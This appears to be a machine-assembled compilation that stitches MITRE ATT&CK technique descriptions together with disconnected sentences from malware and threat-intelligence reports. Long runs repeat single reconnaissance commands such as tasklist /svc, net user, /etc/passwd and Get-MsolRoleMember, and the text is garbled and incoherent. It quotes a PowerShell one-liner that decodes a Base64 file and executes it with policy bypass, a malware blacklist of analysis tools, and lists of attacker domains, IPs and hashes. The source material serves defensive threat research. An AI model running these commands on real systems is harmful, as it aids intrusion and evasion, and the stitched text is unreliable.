tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
tasklist /svc 
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
 sc query
Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.

Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden
The locations:  For root user  path: /Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ processname: screenassistantd  For regular user  path: ~/Library/Spelling/ processname: spellagentd Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file
At installation, the MSI file drops three files and creates one hidden directory (UFile) into C:\ProgramData\Apple\Update\, likely as a ruse
Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

On Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.

Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.
This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4
The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6…) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place
The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes
Gather domain and account names based on all running processes  Gathering account information from running processes
Visitors are asked to download the “University Of Oxford Job Symposium Pre-Register Tool”:  The downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers: OxfordSymposiumRegTool.exe f77ee804de304f7c3ea6b87824684b33 If run by the victim, their computer would get infected, while they are shown this registration process:    Note that after completing the “registration process”, the victim is asked to send the form to an email address in oxford-careers[.]com, which also belongs to the attackers
Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it
Verifies that there is no process with the name “rsyncd” on the active process list (“dbus-inotifier” if the Trojan does not have root privileges)
It searches the active process list for the systemd process
Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted
“win32_remote“,”win64_remote64“,”ollydbg“,”ProcessHacker“,”tcpview“,”autoruns“,”autorunsc“,”filemon“,”procmon“,”regmon“,”procexp“,”idaq“,”idaq64“,”ImmunityDebugger“,”Wireshark“,”dumpcap“,”HookExplorer“,”ImportREC“,”PETools“,”LordPE“,”dumpcap“,”SysInspector“,”proc_analyzer“,”sysAnalyzer“,”sniff_hit“,”windbg“,”joeboxcontrol“,”joeboxserver“  Blacklisted process names in the malware In some cases, it calculates the checksum of each running process name, and if it matches any hard-coded checksums, it causes a BSOD via the ntdll.dll “NtRaiseHardError” function
This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id
It is created as a separate process instead of child process of Office applications
Enumerates running processes for “Wireshark” and “Sysinternals”
What does the Poseidon Group do? What happens after a target machine is infected? Once the target’s machine is compromised, the attacker first enumerates all processes running in the system and all services
78 runin.bin List of processes names and associated plugins should be run inside these processes
The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher
While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.
As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
 lists the running processes
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
ps 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
 tasklist 
Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

In Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.
The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \”id\”:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file
After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file
One of the documents we examined with the filename Rocket attacks on Israel.docx (SHA256: 34bdb5b364..) contained inconsistent creation and last modified timestamps, with the last modified timestamp occurring before the creation timestamp
Adversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.

Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)
The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt
Create a process by impersonating a logged-on user  Getting a user token using WTSQueryUserToken
The tokens for each platform are hardcoded within the sample:November 2016 to January 2017: "Evil New Year" CampaignIn the early part of 2017, Group123 started the "Evil New Year" campaign
Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.
Figure 6 Relational diagram of artifacts  We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3
Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16
From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity
- There were two interesting sub-classes found inside Main Activity: Receiver and Sender
Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)

Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)

In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.

Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)

Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)
SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.
ARTIFACTS: Documents:     2781526f6b302da00661b9a6a625a5a6ecf4ffccafa61202e9b0e9b61b657867     c357396ca82fdcd6b6f46b748f2b6941051dbc81be5326cf9548e6e95507af7c     ffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685     Domains:  true-deals[.]com; strikes-withlucky[.]com Email account in registration is: isvarawski@yahoo.com Attacker email account: adrian.1987clark@yahoo.com
Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Carefully consider the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator accounts regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.Segment networks into logical enclaves and restrict host-to-host communication paths
This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data
AutoFocus customers may learn more from the DarkHydrus tag  IOC Related SHA256 Hashes Payloads cec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1 ac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4 a547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88 d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda dd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffa b2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81 c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3 ce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd00 99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c Delivery documents d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318 8063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde 9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49 cf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f9 0a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc1 0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82 870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8 ff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb0 01fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e2 6dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a 47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870 776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4 cf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0 e88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc678 26e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245 b5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350 ad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771c Related Domains maccaffe[.]com cisc0[.]net 0utl00k[.]net msdncss[.]com 0ffice[.]com 0ffiice[.]com micrrosoft[.]net anyconnect[.]stream bigip[.]stream  fortiweb[.]download  kaspersky[.]science  microtik[.]stream  owa365[.]bid  symanteclive[.]download  windowsdefender[.]win allexa[.]net kaspersky[.]host hotmai1[.]com 0utlook[.]bid
Message 2:    Headers Received: by mailcenter.support   Sender Council on Foreign Relations <webprint@fprii.net>   Subject The Four Traps China May Fall Into   Body Content and images included within the e-mail body were a direct copy of the following CFR article: https://www.cfr.org/blog/four-traps-china-may-fall   Notes Multiple hyperlinks within the e-mail body lead to a malicious RTF document located at the URL  hxxp://fprii.net/The_Four_Traps_for_China.doc
IOCs Domain supservermgr[.]com URL hxxp://supservermgr[.]com/sys/upd/pageupd.php Zebrocy d697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc cba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df 25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8 115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03 f27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1 5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2 dd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d Koadic abbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca User Agents Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 IPs 185.25.51[.]198 185.25.50[.]93 220.158.216[.]127 92.114.92[.]102 86.106.131[.]177  DDE Docs 85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5 8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff
Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network
It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools: Komplex: /Users/kazak/Desktop/Project/komplex XAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX We believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system
With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain
The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system information, AVs registered in the system, privileges, domain and workgroup information
The shareDll32 module then enumerates and identifies systems connected on the same domain using WNetEnumResource and GetComputerNameW
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
net user 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net group 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 net localgroup 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 /etc/passwd 
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
 Get-MsolRoleMember
Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.
Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory
Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015
Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.”      Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here
Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment
However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands
The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process
The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker’s server
(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant is executed
The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line: powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini) The rest of the malicious activities are performed by the PowerShell Script
PowerShell File Analysis The PowerShell script employs several layers of obfuscation to hide its actual functionality
Figure 11: PowerShell script is XOR encoded using a single byte key After deobfuscating the contents of the PowerShell Script, we can divide it into three sections
